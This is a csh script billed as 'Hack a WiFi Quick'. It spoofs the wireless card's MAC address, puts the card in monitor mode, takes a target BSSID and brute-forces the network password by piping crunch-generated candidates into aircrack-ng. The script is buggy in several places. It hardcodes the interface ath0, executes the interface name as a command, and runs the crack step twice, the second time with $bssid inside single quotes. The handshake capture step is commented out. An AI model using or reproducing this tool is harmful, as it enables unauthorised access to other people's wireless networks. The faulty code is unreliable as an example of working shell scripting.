#!/bin/csh
setenv DEPENDANCIES 'sudo aircrack-ng macchanger'
### Program intro and copyrights
echo "hawq version 1.00 (C) 2018 Rodney Olav C. Melby, Hack a WiFi Quick"

#-----------------------------------------------------------------------------
# Get the physical and virtual addresses for wlan device
#-----------------------------------------------------------------------------

set wlan = `ifconfig | grep wlan | awk '{print $1}' | head -1 | sed 's/.$//'`
set phy = `ifconfig -L | head -1 | awk '{print $1}' | sed 's/.$//'`
set interface = `$wlan`

#----------------------------------------------------------
# Parse command line items
#----------------------------------------------------------

if($1 == help) then
	echo "Usage: sudo ./mashup-script.cshrc"
	exit
endif

#----------------------------------------------------------
# Require sudo or root
#----------------------------------------------------------

if(`whoami` != root) then
	echo "ERROR: root permissions required!, run as root e.g. su root"
	exit
endif

#----------------------------------------------------------
# Start Program Mash Up
#----------------------------------------------------------

echo -n "Attempting to down wifi ..." # user log
sleep 1
ifconfig $wlan down # down wifi
echo " Wifi Down" # user log
sleep 1
echo "Changing WiFi MAC address ..." # user log
sleep 1

#----------------------------------------------------------
# Check for and Execute Macchanger
#----------------------------------------------------------

csh -c 'exec macchanger -r '$wlan # change mac address of wifi

if ($status != 0) then # missing program macchanger
	echo "Error: Please Install macchanger" # prompt user
	exit # exit
endif

#----------------------------------------------------------
# Check for and Execute airmon-ng / aircrack-ng
#----------------------------------------------------------

echo -n "MAC address changed ..." # user log
sleep 1
ifconfig $wlan up # turn wifi back on/up
echo " Wifi Up" # user log
sleep 1
echo -n "Starting Monitor Mode ..." # user log
sleep 1

csh -c 'airmon-ng start ath0' # start sniffing wifi traffic

if ($status != 0) then # missing program aircrack-ng
	echo "Error: Please install aircrack-ng suite" # prompt user
	exit # exit
endif

echo -n "Press Ctrl ^C when ready ..." # WiFi Monitor Mode enabled
echo "Enter the bssid to crack" # WiFi Monitor Mode enabled
set bssid = $<
        #echo " $uname!"
crunch 0 6 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng --bssid $bssid -w- handshakefile.cap


sleep 1

csh -c 'crunch 0 6 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 | aircrack-ng --bssid $bssid -w- handshakefile.cap' # start sniffing wifi traffic

#csh -c 'airmon-ng start ath0' # start sniffing wifi traffic

#echo -n "Trying to Smell Bad Code Smells ..." # user log
#csh -c 'airodump-ng '$phy' >& /dev/stdout | tee -a captures.txt' # capture wifi traffic

sleep 2

#MONITOR MODE ENABLED

#----------------------------------------------------------
# Clean Up Interfaces and Monitors
#----------------------------------------------------------

csh -c 'airmon-ng stop '$wlan # change mac address of wifi
ifconfig $wlan down # down wifi
ifconfig $wlan up # down wifi

echo "Success" # user log

setenv setprompt $PWD
set currentDirectory = $PWD
